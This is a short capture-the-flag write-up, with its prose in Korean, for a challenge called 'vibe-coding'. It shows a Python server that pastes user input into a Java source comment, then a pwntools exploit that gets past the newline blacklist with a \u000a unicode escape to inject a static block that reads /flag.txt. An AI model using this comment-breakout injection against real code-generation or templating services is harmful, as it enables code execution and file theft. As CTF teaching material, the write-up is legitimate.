# vibe-coding

```python
#!/usr/bin/env python3

import os

FILE_TEMPLATE = """
import java.io.*;

public class Main {
    // %s
    public static void main(String[] args) {
        // TODO: implement me
    }

    public static String getFlag() throws IOException {
        // FIXME: we probably don't want the user accessing this; just throw for now
        throw new RuntimeException("Not implemented yet");

        // var br = new BufferedReader(new FileReader("/flag.txt"));
        // return br.readLine();
    }
}
"""

blacklist = ['\r', '\n']

if __name__ == "__main__":
    print(r"""+
|        ______  _____  _____  ____    ______  _____   ______   ______  _____  _____   _____
|       |      >/     ||_    ||    |  |   ___||     | |   ___| |   ___|/     \|     | |     |
|       |     < |  /  | |    ||    |_ |   ___||     \  `-.`-.  |   |__ |     ||     \ |    _|_
|       |______>|_____/ |____||______||______||__|\__\|______| |______|\_____/|__|\__\|___| |_|
+
Welcome to b01lersCorp Semantic LOad-balanced Program GENerator (SLOPGEN) v3.20.25.
    """, flush=True)
    comment = input('Enter your prompt below:\n> ')

    # No tricks, please :)
    for banned in blacklist:
        if banned in comment:
            print('Illegal characters: terminating...')
            exit()

    with open('/tmp/Main.java', 'w') as f:
        # Write the prompt into the source file
        f.write(FILE_TEMPLATE % comment)

        # TODO: run the actual model !!!

    print('\nYour program output:\n', flush=True)
    os.system('cd /tmp && javac Main.java && java Main')
    print('===', flush=True)

```

java코드를 입력받는다. 하지만 \r과 \n이 blacklist로 필터링되고 있다. 이는 \u000a으로 우회할 수 있다. 같은 경로에 flag.txt가 있기때문에 이를 읽는 java코드를 짜면 된다.

```python
from pwn import *
p = remote('vibe-coding.atreides.b01lersc.tf',8443,ssl=True)

payload = b"\\u000astatic{try{java.io.BufferedReader br=new java.io.BufferedReader(new java.io.FileReader(\"/flag.txt\"));System.out.println(br.readLine());}catch(Exception ignored){}}"
p.sendline(payload)
p.interactive()
```